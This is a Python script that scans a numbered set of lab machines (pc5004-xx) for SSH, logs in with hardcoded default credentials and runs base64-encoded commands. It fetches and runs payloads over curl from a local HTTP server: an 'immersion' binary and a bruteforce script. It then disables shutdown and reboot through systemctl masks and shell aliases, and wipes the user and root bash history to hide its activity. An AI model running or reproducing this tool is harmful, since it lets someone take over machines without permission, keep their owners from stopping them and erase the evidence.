#!/usr/bin/python3
import os, sys, socket, string
from subprocess import PIPE, Popen
from threading import Thread
from datetime import datetime
from time import sleep
from base64 import b64encode, b64decode



immersion_path = "~/Documents/immersion"
brute_force_py_path = "~/Documents/bruteforce_incomplet.py"


def urlencode(url: str):
    is_ok = string.ascii_letters + "0123456789-_.~"
    ret = list(url)
    for (i, c) in enumerate(ret):
        if c not in is_ok:
            ret[i] = f"%{c.encode().hex()}".upper()
    return "".join(ret)

def get_private_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

def ssh_open(host: str, _timeout: int = 5) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(_timeout)
        result = sock.connect_ex((host, 22))
        sock.close()
        return result == 0
    except Exception as e:
        return False
def test_ssh_port_by_block(hostnames: list[str]) -> list[str]:
    ret = []
    for hostname in hostnames:
        if ssh_open(hostname):
            ret.append(hostname)
    return ret

def getHostNames(prefix = "pc5004-", suffix = ""):
    ret = []
    i = 0
    ths = []
    lst = []
    for i in range(1, 36):
        hostname = f"{prefix}{str(i).zfill(2)}{suffix}"
        lst.append(hostname)
        if i >= 5:
            ths.append(Thread(target=lambda l, r: r.extend(test_ssh_port_by_block(l)), args=(lst.copy(), ret)))
            ths[-1].start()
            lst = []
            i = 0
        i += 1
    if len(lst) > 0:
        ths.append(Thread(target=lambda l, r: r.extend(test_ssh_port_by_block(l)), args=(lst.copy(), ret)))
        ths[-1].start()
        lst = []
        i = 0
    for th in ths:
        th.join()
            
    return ret


def execute_ssh_command(host: str, user: str, passwd: str, command: str):
    # sshpass -p "kali" ssh -o ConnectTimeout=30 -o StrictHostKeyChecking=no kali@pc5004-"$pc" "cmd" &
    ssh_command = [
        "sshpass",
        "-p",
        passwd,
        "ssh",
        "-o",
        "ConnectTimeout=30",
        "-o",
        "StrictHostKeyChecking=no",
        f"{user}@{host}",
        command,
    ]
    process = Popen(ssh_command, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode(), stderr.decode()

class CyberDevice:
    def __init__(self, hostname: str, username: str, password: str, http_server_url: str):
        self.hostname = hostname
        self.username = username
        self.password = password
        self.http_server_url = http_server_url
        self._id = self.hostname.split("-")[-1].split('.')[0]
    
    def execute_command(self, command: str):
        cmdE = f"echo {b64encode(command.encode()).decode()} | base64 -d | bash"
        return execute_ssh_command(self.hostname, self.username, self.password, cmdE)
    
    def execute(self, command: str):
        return self.execute_command(command)

    def transfer_file(self, filename: str, remote_path: str):
        self.execute_command(f"curl {self.http_server_url}/{urlencode(filename)} > {remote_path} && chmod +rx {remote_path}")
    
    def assert_immersion_running(self):
        stdout, stderr = self.execute_command("pgrep immersion")
        if stdout.strip() == "":
            return "immersion <password>" in self.execute_command(immersion_path)[0]
        else:
            return False
    
    def transfer_needed_files(self):
        if self._id.isdigit() and int(self._id) % 2 == 0:
            self.transfer_file("immersion", immersion_path)
        else:
            self.transfer_file("bruteforce_incomplet.py", brute_force_py_path)
    def clear_history(self):
        self.execute("echo '' > ~/.bash_history")
        self.execute("sudo echo '' > /root/.bash_history")

    def mask_dangerous(self):
        self.execute("sudo systemctl mask poweroff.target")
        self.execute("sudo systemctl mask shutdown.target")
        self.execute("sudo systemctl mask reboot.target")

        self.execute("echo \"alias reboot='echo'\" >> ~/.bashrc")
        self.execute("echo \"alias shutdown='echo'\" >> ~/.bashrc")
        self.execute("echo \"alias poweroff='echo'\" >> ~/.bashrc")

        self.clear_history()

    def ssh_open(self):
        return ssh_open(self.hostname)
    
    
    def setup(self):
        self.mask_dangerous()
        self.transfer_needed_files()
        if self._id.isdigit() and int(self._id) % 2 == 0:
            if not self.assert_immersion_running():
                print(f"immersion not running in: {self.hostname}...")
        

def http_server(port):
    contents_types = {
        ".html": "text/html",
        ".css": "text/css",
        ".js": "application/javascript",
        ".png": "image/png",
        ".jpg": "image/jpeg",
        ".gif": "image/gif",
        ".txt": "text/plain",
        "data": "application/octet-stream",
    }
    content_type = "application/octet-stream"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", port))
    sock.listen(999)
    print(f"Serving HTTP on port {port}...")
    while True:
        client, addr = sock.accept()
        try:
            request = client.recv(8192).decode()
            if request.startswith("GET /"):
                ext = os.path.splitext(request.split(" ")[1])[1]
                content_type = contents_types.get(ext, "application/octet-stream")
                filename = os.path.join("scripts", request[5:].split(" ")[0])
                if os.path.isfile(filename):
                    with open(filename, "rb") as f:
                        file_content = f.read()
                    http_response = f"HTTP/1.1 200 OK\r\nContent-Type: {content_type}\r\n\r\n".encode() + file_content
                    client.sendall(http_response)
                    client.close()
                    continue
            else:
                content_type = "text/plain"
            print(f"Received request from {addr}:\n{request}")
            http_response = f"HTTP/1.1 200 OK\r\nContent-Type: {contents_types['.html']}\r\n\r\n" + "\n<br>\n".join(f"<a href='/{urlencode(x)}'>{x} - {os.path.getsize('scripts/' + x)} bytes &nbsp;&nbsp; - &nbsp;&nbsp; {datetime.fromtimestamp(os.path.getmtime('scripts/' + x)).strftime('%y-%m-%d %H:%M:%S')}</a>" for x in os.listdir("scripts"))
            client.sendall(http_response.encode())
            client.close()
        except Exception as e:
            print(f"Error handling request from {addr}: {e}")
            client.close()



def run_http_server_in_background(port):
    thread = Thread(target=http_server, args=(port,))
    thread.daemon = True
    thread.start()

def process_cyber_device(device: CyberDevice):
    device.mask_dangerous()
    device.transfer_needed_files()
    if device.assert_immersion_running():
        print(f"  - Immersion is running on {device.hostname}.")
    else:
        print(f"  - Immersion is NOT running on {device.hostname}.")
    device.clear_history()

def main():
    port = 8589
    run_http_server_in_background(port)
    ip = get_private_ip()
    print(f"HTTP server is running at http://{ip}:{port}/")
    i = 0
    user = "user"
    ths = []
    try:
        devices = getHostNames("pc5004-", "")
        devicesSessions = []
        print(devices)
        for (i, name) in enumerate(devices):
            devicesSessions.append(
                    CyberDevice(
                    hostname=name,
                    username="user",
                    password="live",
                    http_server_url=f"http://{ip}:{port}"
                )
            )
            device = devicesSessions[i]
            ths.append(Thread(target=process_cyber_device, args=(device,)))
            ths[-1].start()
            print(f"[{i+1}/{len(devices)}] Processing device {device.hostname}...")
        for th in ths:
            th.join()

    except KeyboardInterrupt:
        print("Shutting down server.")

if __name__ == "__main__":
    main()
